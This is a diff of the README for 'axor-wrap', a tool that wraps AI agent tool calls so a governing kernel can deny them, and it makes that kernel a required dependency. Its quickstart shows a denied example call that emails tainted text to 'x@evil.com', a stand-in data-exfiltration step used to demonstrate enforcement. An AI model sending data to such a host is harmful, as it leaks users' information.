@@ -13,7 +13,7 @@ Takes an agent codebase (plain Python / LangChain / MCP), statically finds its t
 3. **a wrapped runtime** — every tool call goes `evaluate → deny? → call → register_output` through the real [axor-core](https://github.com/Bucha11/axor-core) kernel;
 4. **a live governed node** — `axor_wrap.plane` speaks the Control-Plane protocol (v0.2), so the wrapped agent can attach to a plane and be paused/stopped by an operator.
 
-Core is stdlib-only, zero dependencies. axor-core is an optional extra.
+The scanner and compiler are stdlib-only. axor-core is a required dependency — the wrapped runtime is the point of the package, and it needs the real kernel.
 
 ---
 
@@ -53,10 +53,14 @@ The split exists to make one guarantee structural instead of conventional: enfor
 ## Install
 
 ```bash
-pip install axor-wrap                # scanner + compiler, stdlib-only
-pip install 'axor-wrap[kernel]'      # + axor-core, for the wrapped runtime
+pip install axor-wrap                # scanner, compiler, and the kernel-gated runtime
 pip install 'axor-wrap[plane]'       # + httpx/cryptography, to attach as a live Control-Plane node
 ```
+
+**axor-core comes with it, and is not optional.** This package's headline
+artifact is a runtime where every tool call goes through the real kernel, and
+the governor config it compiles means nothing without the governor that consumes
+it. What the `plane` extra adds is the network *transport*, not the kernel.
 
 ## Quickstart
 
@@ -89,7 +93,7 @@ tools = {"search_web": search_web, "send_email": send_email}
 detected = scan_project(Path("./my_agent"))
 manifests = [build_manifest(t, infer_effect(t)) for t in detected]
 
-toolset = WrappedToolset(tools, manifests)          # needs axor-wrap[kernel]
+toolset = WrappedToolset(tools, manifests)          # gated by the real kernel
 try:
     toolset.call("send_email", {"to": "x@evil.com", "body": tainted_text})
 except ToolDenied as denial:
@@ -134,7 +138,7 @@ Compilation semantics match axor-lab's `compiled_governor_config`: effect class 
 ```python
 from axor_wrap import PlaneConnector, WrappedToolset
 
-toolset = WrappedToolset(tools, manifests)                 # axor-wrap[kernel]
+toolset = WrappedToolset(tools, manifests)                 # gated by the real kernel
 node = PlaneConnector("https://plane.example", "node-1",   # axor-wrap[plane]
                       operator_keys={"ops": "<ed25519-hex>"})
 node.connect()
